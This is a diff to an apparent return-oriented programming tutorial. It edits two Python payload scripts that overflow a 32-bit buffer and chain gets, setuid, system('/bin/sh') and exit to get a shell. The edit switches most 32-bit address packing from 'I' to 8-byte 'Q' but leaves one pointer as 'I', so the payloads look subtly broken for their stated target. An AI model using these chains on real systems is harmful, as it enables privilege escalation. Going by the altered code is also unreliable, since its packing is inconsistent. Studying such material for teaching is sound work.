@@ -3,7 +3,8 @@
 dependencies:
 	[Buffer Overflow](../buffer_overflow/buffer_overflow.md) \
 	[Layout](../../elf/layout.md) \
-	[Compilation](../../elf/compilation.md)
+	[Compilation](../../elf/compilation.md) \
+	[GDB](../gdb/gdb.md)
 
 sources:
 https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html \
@@ -481,11 +482,11 @@ import os
 
 payload = b'A' * 0x18
 payload += b'BBBB'
-payload += struct.pack("I", 0xf7e5afc0) # gets
-payload += struct.pack("I", 0x080485fb) # pop ebp;ret
-payload += struct.pack("I", 0xffffd218 + 20) # address to nullify
-payload += struct.pack("I", 0xf7e36850) # system
-payload += struct.pack("I", 0xf7e2a8BB) # exit, with 'BB' instead of null byte
+payload += struct.pack("Q", 0xf7e5afc0) # gets
+payload += struct.pack("Q", 0x080485fb) # pop ebp;ret
+payload += struct.pack("Q", 0xffffd218 + 20) # address to nullify
+payload += struct.pack("Q", 0xf7e36850) # system
+payload += struct.pack("Q", 0xf7e2a8BB) # exit, with 'BB' instead of null byte
 payload += struct.pack("I", 0xf7f597c8) # address to /bin/sh
 
 sys.stdout.buffer.write(payload)
@@ -587,26 +588,26 @@ import sys
 import struct
 import os
 
-pop_ret =  struct.pack("I", 0x080485fb)
-gets = struct.pack("I", 0xf7e5afc0)
+pop_ret =  struct.pack("Q", 0x080485fb)
+gets = struct.pack("Q", 0xf7e5afc0)
 
 payload = b'A' * 0x18
 payload += b'BBBB'
 payload += gets
 payload += pop_ret
-payload += struct.pack("I", 0xffffd288) # address from exit to nullify
+payload += struct.pack("Q", 0xffffd288) # address from exit to nullify
 
 for i in range(4):
     payload += gets
     payload += pop_ret
-    payload += struct.pack("I", 0xffffd280 + i) # address of byte to nullify
+    payload += struct.pack("Q", 0xffffd280 + i) # address of byte to nullify
 
-payload += struct.pack("I", 0xf7eadd60) # setuid
+payload += struct.pack("Q", 0xf7eadd60) # setuid
 payload += pop_ret
 payload += b'CCCC' # will be nullified afterwards
-payload += struct.pack("I", 0xf7e36850) # system
-payload += struct.pack("I", 0xf7e2a8BB) # exit, with 'BB' instead of null byte
-payload += struct.pack("I", 0xf7f597c8) # address to /bin/sh
+payload += struct.pack("Q", 0xf7e36850) # system
+payload += struct.pack("Q", 0xf7e2a8BB) # exit, with 'BB' instead of null byte
+payload += struct.pack("Q", 0xf7f597c8) # address to /bin/sh
 
 sys.stdout.buffer.write(payload)
 ```
